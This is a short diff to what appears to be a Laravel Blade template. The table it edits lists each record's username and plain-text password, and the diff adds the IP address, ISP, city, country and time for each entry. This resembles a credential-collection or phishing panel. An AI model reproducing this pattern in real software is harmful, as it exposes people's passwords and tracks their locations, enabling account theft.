@@ -16,6 +16,11 @@
                 <tr>
                     <th>Username</th>
                     <th>password</th>
+                    <th>ip</th>
+                    <th>isp</th>
+                    <th>city</th>
+                    <th>country</th>
+                    <th>time</th>
                 </tr>
             </thead>
             <tbody>
@@ -23,6 +28,11 @@
                 <tr>
                     <td>{{ $dataI->username }}</td>
                     <td>{{ $dataI->password }}</td>
+                    <td>{{ $dataI->ip }}</td>
+                    <td>{{ $dataI->isp }}</td>
+                    <td>{{ $dataI->city }}</td>
+                    <td>{{ $dataI->country }}</td>
+                    <td>{{ $dataI->created_at }}</td>
                 </tr>
                 @endforeach
             </tbody>
